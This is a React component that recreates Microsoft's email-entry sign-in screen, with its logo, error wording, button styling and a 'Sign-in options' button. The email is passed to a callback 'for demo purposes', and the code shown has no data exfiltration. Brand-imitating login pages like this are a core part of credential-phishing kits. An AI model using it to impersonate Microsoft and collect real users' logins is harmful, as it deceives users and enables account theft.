'use client'

import { useState } from 'react';
import MicrosoftLogo from './MicrosoftLogo';
import { KeyRound } from 'lucide-react';

export default function EmailPage({ onNext }) {
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!email.trim()) {
      setError('Enter a valid email address, phone number, or Skype name.');
      return;
    }

    // Here you would normally validate the email
    // For demo purposes we'll just proceed
    onNext(email);
  };

  return (
    <div >
        <div className="flex flex-col bg-white  shadow-xl p-12 w-[440px]">
        <MicrosoftLogo />
        
        <h1 className="text-2xl font-semibold mt-6 mb-4 text-gray-900">Sign in</h1>
        
        <form onSubmit={handleSubmit}>
            <div className="mb-4">
                {error && <div className="text-red-600 text-md mt-1">{error}</div>}
            <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="someone@example.com"
                className="w-full pt-2 pb-2 text-base text-gray-800 border-b-2 border-gray-300 focus:border-ms-blue focus:outline-none"
                aria-label="Email"
            />
            </div>
            
            <div className="text-[12px] text-ms-blue mb-6 text-blue-500">
            <a href="#" className="hover:underline hover:text-gray-400">Can't access your account?</a>
            </div>
            
            <div className="flex justify-end gap-2 pt-10  ">
                {/* <button
                    type="button"
                    className="px-10 py-1 text-md bg-gray-200 cursor-pointer text-black  hover:bg-gray-300"
                >
                    Back
                </button> */}
                <button
                    type="submit"
                    className="px-10 py-1 bg-[#0067b8] text-white cursor-pointer hover:bg-[#0067b8]"
                >
                    Next
                </button>
            </div>
        </form>
        

        
        {/* <div className="flex justify-between text-xs text-gray-600 mt-16">
            <a href="#" className="hover:underline">Terms of use</a>
            <a href="#" className="hover:underline">Privacy & cookies</a>
            <a href="#" className="hover:underline">...</a>
        </div> */}
        </div>

        <div className="mt-6 bg-white shadow-2xl ">
        <button className="flex items-center justify-start w-full p-[12px] border cursor-pointer border-gray-300  text-sm text-gray-900 hover:bg-gray-200">
            <div className='pl-8'>
                <KeyRound strokeWidth={1.3} className="transform scale-x-[-1]" />
            </div>
             <div className='pl-4'>
                Sign-in options
             </div>
        </button>
      </div>

    </div>
    
  );
} 